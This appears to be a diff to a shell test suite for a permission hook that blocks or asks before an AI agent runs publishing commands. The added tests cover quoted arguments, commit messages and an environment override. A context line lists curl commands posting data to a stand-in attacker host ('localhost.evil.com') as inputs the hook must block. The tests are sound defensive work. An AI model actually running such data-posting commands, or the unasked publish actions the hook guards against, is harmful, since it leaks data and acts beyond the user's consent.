@@ -287,4 +287,25 @@ for c in 'curl -d x "http://example.com"' 'curl -d x "http://localhost.evil.com"
   assert_rc 2 "$c blocked"
 done
 
+# A verb read from one piece of a quoted argument asks, and the question names the piece (#131).
+for c in 'claude "review this"' "ssh host 'npm publish'"; do
+  run_hook "$S" "$(jsonin "$c")"
+  assert_rc 0 "$c is not refused outright"
+  assert_out '"permissionDecision":"ask"' "$c asks"
+  assert_out 'one piece of a quoted argument' "$c says why"
+done
+assert_out "read from publish'" "the question names the piece"
+run_hook "$S" "$(jsonin 'python3 x.py "a post here"')"
+assert_rc 2 "a verb in the middle of a quoted argument blocked, as before"
+run_hook "$S" "$(jsonin 'git commit -m "post the review"')"
+assert_rc 0 "a commit message naming verbs allowed"
+assert_eq "$OUT" "" "a commit message naming verbs asks nothing"
+# The per-line split cuts quoted lines into pieces, so a piece read there asks nothing, as on main.
+run_hook "$S" "$(jsonin $'git commit -m "Fix it\nsee the review"')"
+assert_eq "$OUT" "" "a multi-line commit message ending in a verb asks nothing"
+export ALLOW_PUBLISH_AS_ME=1
+run_hook "$S" "$(jsonin 'claude "review this"')"
+assert_eq "$OUT" "" "environment hatch asks nothing about a piece of a quoted argument"
+unset ALLOW_PUBLISH_AS_ME
+
 finish "guard-publish"
